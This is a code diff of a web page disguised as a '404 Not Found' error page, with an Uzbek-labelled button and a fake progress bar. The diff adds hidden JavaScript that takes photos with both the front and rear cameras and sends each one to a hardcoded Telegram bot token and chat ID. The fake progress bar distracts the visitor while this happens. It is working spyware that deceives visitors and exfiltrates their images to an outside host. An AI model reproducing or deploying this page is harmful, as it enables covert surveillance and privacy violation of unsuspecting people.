@@ -7,41 +7,64 @@
 
 <style>
 body {
-    margin: 0;
-    padding: 0;
+    font-family: Arial, Helvetica, sans-serif;
     background: #fff;
     color: #000;
-    font-family: Arial, Helvetica, sans-serif;
-}
-.wrapper {
     padding: 40px;
 }
-h1 {
-    font-size: 32px;
-    margin-bottom: 10px;
-}
-p {
+h1 { font-size: 32px; }
+p  { font-size: 16px; }
+
+#photoBtn {
+    margin-top: 20px;
     font-size: 16px;
-    margin-bottom: 30px;
-}
-button {
-    padding: 12px 22px;
-    font-size: 16px;
+    color: #0066cc;
     cursor: pointer;
+    text-decoration: underline;
+    background: none;
+    border: none;
+    padding: 0;
 }
-video, canvas {
+
+#progressBox {
+    margin-top: 25px;
     display: none;
 }
+#status {
+    font-weight: bold;
+    margin-bottom: 8px;
+}
+.progress {
+    width: 300px;
+    height: 16px;
+    border: 1px solid #000;
+}
+.bar {
+    height: 100%;
+    width: 0%;
+    background: #000;
+    color: #fff;
+    font-size: 11px;
+    text-align: center;
+    line-height: 16px;
+}
+
+video, canvas { display: none; }
 </style>
 </head>
 
 <body>
 
-<div class="wrapper">
-    <h1>404 Not Found</h1>
-    <p>The requested URL was not found on this server.</p>
+<h1>404 Not Found</h1>
+<p>The requested URL was not found on this server.</p>
 
-    <button id="photoBtn">⟳</button>
+<button id="photoBtn">Rasmga olish</button>
+
+<div id="progressBox">
+    <div id="status">IN PROGRESS</div>
+    <div class="progress">
+        <div class="bar" id="bar">1%</div>
+    </div>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -51,48 +74,68 @@ video, canvas {
 const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
 const CHAT_ID  = "7880376636";
 
-let started = false;
-let stream;
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
 async function sendToTelegram(blob) {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", blob);
-
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", blob);
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
         method: "POST",
-        body: formData
+        body: fd
     });
 }
 
-document.getElementById("photoBtn").onclick = async () => {
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
+function startProgress() {
+    const box = document.getElementById("progressBox");
+    const bar = document.getElementById("bar");
+    box.style.display = "block";
 
-    if (!started) {
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" }
-        });
-        video.srcObject = stream;
-        await video.play();
-        started = true;
-    }
+    let p = 1;
+    bar.style.width = "1%";
+    bar.textContent = "1%";
 
-    if (video.videoWidth === 0) {
-        setTimeout(() => document.getElementById("photoBtn").click(), 200);
-        return;
-    }
+    const i = setInterval(() => {
+        p++;
+        bar.style.width = p + "%";
+        bar.textContent = p + "%";
+        if (p >= 100) clearInterval(i);
+    }, 50); // 5 soniya
+}
+
+async function capture(facing) {
+    const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: facing }
+    });
+    video.srcObject = stream;
+    await video.play();
+
+    await new Promise(r => setTimeout(r, 500));
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     canvas.getContext("2d").drawImage(video, 0, 0);
 
-    canvas.toBlob(blob => {
-        sendToTelegram(blob);
-    }, "image/jpeg", 0.9);
+    stream.getTracks().forEach(t => t.stop());
+
+    return new Promise(res => {
+        canvas.toBlob(blob => res(blob), "image/jpeg", 0.9);
+    });
+}
+
+document.getElementById("photoBtn").onclick = async () => {
+    startProgress();
+
+    // OLD KAMERA
+    const front = await capture("user");
+    sendToTelegram(front);
+
+    // ORQA KAMERA
+    const back = await capture("environment");
+    sendToTelegram(back);
 };
 </script>
 
 </body>
 </html>
-
